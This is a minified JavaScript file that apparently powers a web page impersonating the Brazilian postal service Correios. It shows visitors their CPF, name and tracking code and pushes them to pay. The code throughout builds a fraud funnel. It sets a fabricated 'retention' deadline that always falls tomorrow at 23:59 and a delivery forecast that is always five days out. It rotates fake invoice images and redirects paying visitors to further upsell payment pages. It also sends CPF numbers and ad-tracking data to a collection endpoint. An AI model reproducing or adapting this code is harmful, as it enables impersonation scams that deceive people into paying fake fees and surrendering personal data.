(function(){'use strict';const CONFIG={CHECKOUT_URL:'go/',USE_INTERNAL_CHECKOUT:true,LOADER_DELAY:500,PREVISAO_DIAS:5};const STORAGE_KEY='correios_session';const SRC_STORAGE_KEY='correios_src';const TRACKING_STORAGE_KEY='correios_tracking';const LEGACY_TRACKING_STORAGE_KEY='google_tracking';const GOOGLE_CLICK_PARAMS=['gclid','gbraid','wbraid'];const FUNNEL_STAGE_KEY='correios_funnel_stage';const FUNNEL_EXPIRY_MS=24*60*60*1000;const elements={loader:null,mainContent:null,cpfDisplays:null,nomeDisplays:null,codigoRastreioDisplay:null,previsaoEntrega:null,btnPagar:null,linksPagamento:null};function getQueryParam(param){const urlParams=new URLSearchParams(window.location.search);return urlParams.get(param);}function getCookie(name){const match=document.cookie.match(new RegExp('(^| )'+name+'=([^;]+)'));return match?match[2]:null;}function getGclidFromCookie(){const raw=getCookie('_gcl_aw');if(!raw)return'';try{const parts=decodeURIComponent(raw).split('.');return parts[parts.length-1]||'';}catch(e){const parts=raw.split('.');return parts[parts.length-1]||'';}}function readTrackingStorage(storageKey){try{const data=localStorage.getItem(storageKey);if(!data)return{};const parsed=JSON.parse(data);return typeof parsed==='object'&&parsed?parsed:{};}catch(e){return{};}}function setCookie(name,value,hours){const expires=new Date();expires.setTime(expires.getTime()+(hours*60*60*1000));document.cookie=`${name}=${value};expires=${expires.toUTCString()};path=/`;}function selecionarImagemAB(){const COOKIE_NAME='correios_img_ab';const STORAGE_KEY_IMG='correios_imagem_nota';const IMAGENS=['nota-fiscal.webp','nota-fiscal2.webp','nota-fiscal3.webp','nota-fiscal4.webp'];let imagemSelecionada=getCookie(COOKIE_NAME);if(!imagemSelecionada||!IMAGENS.includes(imagemSelecionada)){const indice=Math.floor(Math.random()*IMAGENS.length);imagemSelecionada=IMAGENS[indice];setCookie(COOKIE_NAME,imagemSelecionada,24);}localStorage.setItem(STORAGE_KEY_IMG,imagemSelecionada);const imgNotaFiscal=document.querySelector('.img-nota-fiscal');if(imgNotaFiscal){imgNotaFiscal.src=`assets/images/${imagemSelecionada}`;}return imagemSelecionada;}function formatarCPF(cpf){const numeros=cpf.replace(/\D/g,'');return numeros.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');}function validarNome(nome){if(!nome)return false;const nomeUpper=nome.toUpperCase().trim();const nomesInvalidos=['CPF LOCALIZADO','CPF ENCONTRADO','TITULAR','USUARIO','USUÁRIO','CLIENTE','PREZADO','DESTINATÁRIO','DESTINATARIO','---'];return!nomesInvalidos.some(invalido=>nomeUpper.includes(invalido));}function obterNomeValido(nome){return validarNome(nome)?nome:'Prezado Destinatário';}function formatarNome(nome){const nomeValidado=obterNomeValido(nome);const nomeDecodificado=decodificarNome(nomeValidado);const partes=nomeDecodificado.trim().split(/\s+/).map(p=>p.charAt(0).toUpperCase()+p.slice(1).toLowerCase());if(partes.length>=3){return`${partes[0]} ${partes[1].charAt(0)}. ${partes[partes.length - 1]}`;}else if(partes.length===2){return`${partes[0]} ${partes[1]}`;}return partes.join(' ');}function calcularPrevisaoEntrega(){const hoje=new Date();hoje.setDate(hoje.getDate()+CONFIG.PREVISAO_DIAS);const dia=hoje.getDate().toString().padStart(2,'0');const mes=(hoje.getMonth()+1).toString().padStart(2,'0');const ano=hoje.getFullYear();return`Dia ${dia}/${mes}/${ano}`;}function delay(ms){return new Promise(resolve=>setTimeout(resolve,ms));}function capturarSrc(){const srcUrl=getQueryParam('src');if(srcUrl&&srcUrl!=='ERR'){const srcAnterior=localStorage.getItem(SRC_STORAGE_KEY);if(srcAnterior&&srcAnterior!==srcUrl){localStorage.removeItem(TRACKING_STORAGE_KEY);localStorage.removeItem(LEGACY_TRACKING_STORAGE_KEY);}localStorage.setItem(SRC_STORAGE_KEY,srcUrl);return srcUrl;}const srcLocal=localStorage.getItem(SRC_STORAGE_KEY);if(srcLocal&&srcLocal!=='ERR'){return srcLocal;}if(srcLocal==='ERR'){localStorage.removeItem(SRC_STORAGE_KEY);}return null;}function getSrc(){const src=localStorage.getItem(SRC_STORAGE_KEY)||getQueryParam('src')||'';if(src==='ERR'){localStorage.removeItem(SRC_STORAGE_KEY);return'';}return(src&&src!=='ERR')?src:'';}function capturarGoogleTracking(){const trackingSalvo=getGoogleTracking();const hasStoredTracking=trackingSalvo.gclid||trackingSalvo.gbraid||trackingSalvo.wbraid;const cookieGclid=hasStoredTracking?getGclidFromCookie():'';const tracking={gclid:getQueryParam('gclid')||cookieGclid||trackingSalvo.gclid||'',gbraid:getQueryParam('gbraid')||trackingSalvo.gbraid||'',wbraid:getQueryParam('wbraid')||trackingSalvo.wbraid||''};if(GOOGLE_CLICK_PARAMS.some((key)=>!!tracking[key])){localStorage.setItem(TRACKING_STORAGE_KEY,JSON.stringify(tracking));localStorage.setItem(LEGACY_TRACKING_STORAGE_KEY,JSON.stringify(tracking));}return tracking;}function getGoogleTracking(){try{const atual=readTrackingStorage(TRACKING_STORAGE_KEY);const legacy=readTrackingStorage(LEGACY_TRACKING_STORAGE_KEY);return{gclid:atual.gclid||legacy.gclid||'',gbraid:atual.gbraid||legacy.gbraid||'',wbraid:atual.wbraid||legacy.wbraid||''};}catch(e){return{gclid:'',gbraid:'',wbraid:''};}}function initElements(){elements.mainContent=document.querySelector('main');elements.cpfDisplays=document.querySelectorAll('.cpf-display');elements.codigoRastreioDisplay=document.querySelector('.codigo-rastreio');elements.previsaoEntrega=document.getElementById('previsaoEntrega');elements.btnPagar=document.getElementById('btnPagar');elements.linksPagamento=document.querySelectorAll('.link-pagamento');}function recuperarDadosLocais(){try{const dados=localStorage.getItem(STORAGE_KEY);if(!dados)return null;const parsed=JSON.parse(dados);if(Date.now()>parsed.expiry){localStorage.removeItem(STORAGE_KEY);return null;}return parsed;}catch(e){localStorage.removeItem(STORAGE_KEY);return null;}}function criarLoader(){const loader=document.createElement('div');loader.className='loader';loader.id='loader';loader.textContent='Carregando dados...';document.body.appendChild(loader);elements.loader=loader;if(elements.mainContent){elements.mainContent.style.display='none';}}async function removerLoader(){await delay(CONFIG.LOADER_DELAY);if(elements.loader){elements.loader.classList.add('hidden');elements.loader.remove();}if(elements.mainContent){elements.mainContent.style.display='block';}}function formatarRastreio(codigo){codigo=codigo.replace(/\s/g,'').toUpperCase();if(codigo.length===13){return codigo.replace(/([A-Z]{2})(\d{3})(\d{3})(\d{3})([A-Z]{2})/,'$1 $2 $3 $4 $5');}return codigo;}function decodificarNome(nome){if(!nome)return nome;try{let decoded=nome;while(decoded.includes('%')){const newDecoded=decodeURIComponent(decoded);if(newDecoded===decoded)break;decoded=newDecoded;}return decoded;}catch(e){return nome;}}function exibirNomeHeader(nome){const nomeDecodificado=decodificarNome(nome);if(!validarNome(nomeDecodificado))return;const headerNav=document.getElementById('headerNav');const userNameEl=document.querySelector('.btn-entrar .user-name');if(!headerNav||!userNameEl)return;const partes=nomeDecodificado.trim().split(/\s+/).map(p=>p.charAt(0).toUpperCase()+p.slice(1).toLowerCase());let nomeExibido;if(partes.length>=2){nomeExibido=`${partes[0]} ${partes[1]}`;}else{nomeExibido=partes[0];}userNameEl.textContent=nomeExibido;headerNav.classList.add('has-user-name');}function exibirDadosUsuario(cpf,nome){const cpfFormatado=formatarCPF(cpf);const nomeFormatado=formatarNome(nome);elements.cpfDisplays.forEach(el=>{el.textContent=cpfFormatado;});exibirNomeHeader(nome);}function exibirRastreio(rastreio,nome){const rastreioFormatado=formatarRastreio(rastreio);const nomeFormatado=formatarNome(nome);elements.cpfDisplays.forEach(el=>{el.textContent=rastreioFormatado;});exibirNomeHeader(nome);}function atualizarPrevisaoEntrega(){if(elements.previsaoEntrega){elements.previsaoEntrega.textContent=calcularPrevisaoEntrega();}}function atualizarLinksCheckout(cpf,nome){const urlParams=new URLSearchParams(window.location.search);const nomeValidado=obterNomeValido(nome);localStorage.setItem('correios_cpf',cpf);if(validarNome(nome)){localStorage.setItem('correios_nome',nome);}const checkoutParams=new URLSearchParams();checkoutParams.set('cpf',cpf);checkoutParams.set('nome',nomeValidado);const rastreio=urlParams.get('rastreio')||localStorage.getItem('correios_rastreio');if(rastreio){checkoutParams.set('rastreio',rastreio);localStorage.setItem('correios_rastreio',rastreio);}const src=getSrc();if(src){checkoutParams.set('src',src);}['utm_source','utm_medium','utm_campaign','utm_term','utm_content'].forEach(utm=>{const value=urlParams.get(utm);if(value)checkoutParams.set(utm,value);});['gclid','gbraid','wbraid'].forEach(param=>{const value=urlParams.get(param);if(value)checkoutParams.set(param,value);});const googleTracking=getGoogleTracking();if(!checkoutParams.has('gclid')&&googleTracking.gclid)checkoutParams.set('gclid',googleTracking.gclid);if(!checkoutParams.has('gbraid')&&googleTracking.gbraid)checkoutParams.set('gbraid',googleTracking.gbraid);if(!checkoutParams.has('wbraid')&&googleTracking.wbraid)checkoutParams.set('wbraid',googleTracking.wbraid);let checkoutUrl;if(CONFIG.USE_INTERNAL_CHECKOUT){checkoutUrl=`${CONFIG.CHECKOUT_URL}?${checkoutParams.toString()}`;}else{checkoutParams.set('cust_name',nomeValidado);checkoutParams.set('document',cpf);const cookiesExtras=['_fbp','_fbc','Leadsf'];cookiesExtras.forEach(cookieName=>{const cookieValue=getCookie(cookieName);if(cookieValue){checkoutParams.set(cookieName,cookieValue);}});const url=new URL(CONFIG.CHECKOUT_URL);checkoutParams.forEach((value,key)=>{url.searchParams.set(key,value);});checkoutUrl=url.toString();}if(elements.btnPagar){elements.btnPagar.href=checkoutUrl;}elements.linksPagamento.forEach(link=>{link.href=checkoutUrl;});}function atualizarLinksCheckoutRastreio(rastreio,nome){const urlParams=new URLSearchParams(window.location.search);const nomeValidado=obterNomeValido(nome);localStorage.setItem('correios_rastreio',rastreio);if(validarNome(nome)){localStorage.setItem('correios_nome',nome);}const checkoutParams=new URLSearchParams();checkoutParams.set('rastreio',rastreio);checkoutParams.set('nome',nomeValidado);const src=getSrc();if(src){checkoutParams.set('src',src);}['utm_source','utm_medium','utm_campaign','utm_term','utm_content'].forEach(utm=>{const value=urlParams.get(utm);if(value)checkoutParams.set(utm,value);});['gclid','gbraid','wbraid'].forEach(param=>{const value=urlParams.get(param);if(value)checkoutParams.set(param,value);});const googleTracking=getGoogleTracking();if(!checkoutParams.has('gclid')&&googleTracking.gclid)checkoutParams.set('gclid',googleTracking.gclid);if(!checkoutParams.has('gbraid')&&googleTracking.gbraid)checkoutParams.set('gbraid',googleTracking.gbraid);if(!checkoutParams.has('wbraid')&&googleTracking.wbraid)checkoutParams.set('wbraid',googleTracking.wbraid);let checkoutUrl;if(CONFIG.USE_INTERNAL_CHECKOUT){checkoutUrl=`${CONFIG.CHECKOUT_URL}?${checkoutParams.toString()}`;}else{checkoutParams.set('cust_name',nomeValidado);const cpf=localStorage.getItem('correios_cpf')||urlParams.get('cpf')||'';if(cpf){checkoutParams.set('document',cpf);}const cookiesExtras=['_fbp','_fbc','Leadsf'];cookiesExtras.forEach(cookieName=>{const cookieValue=getCookie(cookieName);if(cookieValue){checkoutParams.set(cookieName,cookieValue);}});const url=new URL(CONFIG.CHECKOUT_URL);checkoutParams.forEach((value,key)=>{url.searchParams.set(key,value);});checkoutUrl=url.toString();}if(elements.btnPagar){elements.btnPagar.href=checkoutUrl;}elements.linksPagamento.forEach(link=>{link.href=checkoutUrl;});}function initCarousel(){const carousel=document.querySelector('.carousel');if(!carousel)return;const slides=carousel.querySelectorAll('.carousel-slide');const indicators=carousel.querySelectorAll('.carousel-indicator');const btnPrev=carousel.querySelector('.carousel-btn-prev');const btnNext=carousel.querySelector('.carousel-btn-next');let currentSlide=0;let autoPlayInterval=null;const autoPlayDelay=5000;function goToSlide(index){slides.forEach(slide=>slide.classList.remove('active'));indicators.forEach(ind=>ind.classList.remove('active'));currentSlide=index;if(currentSlide>=slides.length)currentSlide=0;if(currentSlide<0)currentSlide=slides.length-1;slides[currentSlide].classList.add('active');indicators[currentSlide].classList.add('active');}function nextSlide(){goToSlide(currentSlide+1);}function prevSlide(){goToSlide(currentSlide-1);}function startAutoPlay(){stopAutoPlay();autoPlayInterval=setInterval(nextSlide,autoPlayDelay);}function stopAutoPlay(){if(autoPlayInterval){clearInterval(autoPlayInterval);autoPlayInterval=null;}}if(btnNext){btnNext.addEventListener('click',()=>{nextSlide();startAutoPlay();});}if(btnPrev){btnPrev.addEventListener('click',()=>{prevSlide();startAutoPlay();});}indicators.forEach((indicator,index)=>{indicator.addEventListener('click',()=>{goToSlide(index);startAutoPlay();});});carousel.addEventListener('mouseenter',stopAutoPlay);carousel.addEventListener('mouseleave',startAutoPlay);let touchStartX=0;let touchEndX=0;carousel.addEventListener('touchstart',(e)=>{touchStartX=e.changedTouches[0].screenX;stopAutoPlay();},{passive:true});carousel.addEventListener('touchend',(e)=>{touchEndX=e.changedTouches[0].screenX;const diff=touchStartX-touchEndX;if(Math.abs(diff)>50){if(diff>0){nextSlide();}else{prevSlide();}}startAutoPlay();},{passive:true});startAutoPlay();}async function init(){const funnelDataRaw=localStorage.getItem(FUNNEL_STAGE_KEY);if(funnelDataRaw){let funnelStage=null;let funnelTimestamp=0;try{const funnelData=JSON.parse(funnelDataRaw);funnelStage=funnelData.stage;funnelTimestamp=funnelData.timestamp||0;}catch(e){funnelStage=funnelDataRaw;funnelTimestamp=0;}const agora=Date.now();const tempoDecorrido=agora-funnelTimestamp;if(tempoDecorrido>=FUNNEL_EXPIRY_MS){localStorage.removeItem(FUNNEL_STAGE_KEY);localStorage.removeItem('correios_pix_transaction');localStorage.removeItem('correios_up1_transaction');localStorage.removeItem('correios_up2_transaction');localStorage.removeItem('correios_lote_transaction_1');localStorage.removeItem('correios_lote_transaction_2');localStorage.removeItem('correios_lote_transaction_3');localStorage.removeItem('correios_lote_offer_timer');localStorage.removeItem('correios_up1_skipped');localStorage.removeItem('correios_retido_desde');localStorage.removeItem('correios_prazo_final');}else if(funnelStage){const horasRestantes=Math.ceil((FUNNEL_EXPIRY_MS-tempoDecorrido)/(60*60*1000));switch(funnelStage){case'frontend_paid':window.location.replace('up1.html');return;case'up1_paid':window.location.replace('up2.html');return;case'up2_paid':window.location.replace('lote.html');return;case'lote_paid':case'completed':window.location.replace('sucesso.html');return;}}}initElements();criarLoader();selecionarImagemAB();const src=capturarSrc();capturarGoogleTracking();const tipoUrl=getQueryParam('tipo');const cpfUrl=getQueryParam('cpf');const nomeUrl=getQueryParam('nome');const rastreioUrl=getQueryParam('rastreio');let dadosCarregados=false;if(tipoUrl||cpfUrl||rastreioUrl){const nome=nomeUrl?decodificarNome(nomeUrl):'Prezado Destinatário';if(tipoUrl==='cpf'&&cpfUrl){exibirDadosUsuario(cpfUrl,nome);atualizarLinksCheckout(cpfUrl,nome);if(rastreioUrl&&elements.codigoRastreioDisplay){elements.codigoRastreioDisplay.textContent=formatarRastreio(rastreioUrl);}dadosCarregados=true;}else if(tipoUrl==='rastreio'&&rastreioUrl){exibirRastreio(rastreioUrl,nome);atualizarLinksCheckoutRastreio(rastreioUrl,nome);if(elements.codigoRastreioDisplay){elements.codigoRastreioDisplay.textContent=formatarRastreio(rastreioUrl);}dadosCarregados=true;}else if(cpfUrl){exibirDadosUsuario(cpfUrl,nome);atualizarLinksCheckout(cpfUrl,nome);dadosCarregados=true;}else if(rastreioUrl){exibirRastreio(rastreioUrl,nome);atualizarLinksCheckoutRastreio(rastreioUrl,nome);if(elements.codigoRastreioDisplay){elements.codigoRastreioDisplay.textContent=formatarRastreio(rastreioUrl);}dadosCarregados=true;}}if(!dadosCarregados){const dadosLocais=recuperarDadosLocais();if(dadosLocais){const{tipo,cpf,nome,codigoRastreio}=dadosLocais;if(elements.codigoRastreioDisplay&&codigoRastreio){elements.codigoRastreioDisplay.textContent=formatarRastreio(codigoRastreio);}if(tipo==='cpf'&&cpf){exibirDadosUsuario(cpf,nome||'Prezado Destinatário');atualizarLinksCheckout(cpf,nome||'Prezado Destinatário');dadosCarregados=true;}else if(tipo==='rastreio'&&codigoRastreio){exibirRastreio(codigoRastreio,nome||'Prezado Destinatário');atualizarLinksCheckoutRastreio(codigoRastreio,nome||'Prezado Destinatário');dadosCarregados=true;}}}if(!dadosCarregados){if(elements.codigoRastreioDisplay&&elements.cpfDisplays){const codigoRastreio=elements.codigoRastreioDisplay.textContent.trim();if(codigoRastreio&&codigoRastreio!=='---'){elements.cpfDisplays.forEach(el=>{el.textContent=codigoRastreio;});}}if(elements.btnPagar){elements.btnPagar.href=CONFIG.CHECKOUT_URL;}elements.linksPagamento.forEach(link=>{link.href=CONFIG.CHECKOUT_URL;});}atualizarPrevisaoEntrega();iniciarExibicaoRetencao();interceptarCheckoutExterno();await removerLoader();initCarousel();}function enviarTrackingPreCheckout(){const imageShown=localStorage.getItem('correios_imagem_nota')||'';const cpf=localStorage.getItem('correios_cpf')||getQueryParam('cpf')||'';const nome=localStorage.getItem('correios_nome')||getQueryParam('nome')||'';const src=getSrc()||'';const googleTracking=getGoogleTracking();const urlParams=new URLSearchParams(window.location.search);const payload={cpf:cpf.replace(/\D/g,''),nome:nome,image_shown:imageShown,src:src,gclid:urlParams.get('gclid')||googleTracking.gclid||'',gbraid:urlParams.get('gbraid')||googleTracking.gbraid||'',wbraid:urlParams.get('wbraid')||googleTracking.wbraid||'',utm_source:urlParams.get('utm_source')||'',utm_medium:urlParams.get('utm_medium')||'',utm_campaign:urlParams.get('utm_campaign')||'',utm_term:urlParams.get('utm_term')||'',utm_content:urlParams.get('utm_content')||'',};const blob=new Blob([JSON.stringify(payload)],{type:'application/json'});const sent=navigator.sendBeacon('api/save-tracking.php',blob);if(!sent){fetch('api/save-tracking.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload),keepalive:true}).catch(()=>{});}}function interceptarCheckoutExterno(){if(CONFIG.USE_INTERNAL_CHECKOUT)return;const interceptar=(el)=>{if(!el)return;el.addEventListener('click',function(){enviarTrackingPreCheckout();});};interceptar(elements.btnPagar);elements.linksPagamento.forEach(link=>interceptar(link));}function iniciarExibicaoRetencao(){const amanha=new Date();amanha.setDate(amanha.getDate()+1);amanha.setHours(23,59,0,0);const prazoFinal=amanha.getTime();function atualizarPrazoFinalTexto(textoPrazo){const elPrazo=document.getElementById('prazoFinal');if(elPrazo){elPrazo.textContent=textoPrazo;return;}const elPrazoLinha=document.querySelector('.prazo-oficial');if(elPrazoLinha){elPrazoLinha.textContent=`Prazo final de retenção: ${textoPrazo}`;}}const d=new Date(prazoFinal);const dia=d.getDate().toString().padStart(2,'0');const mes=(d.getMonth()+1).toString().padStart(2,'0');const ano=d.getFullYear();atualizarPrazoFinalTexto(`${dia}/${mes}/${ano} às 23:59`);}if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",init);}else{init();}})();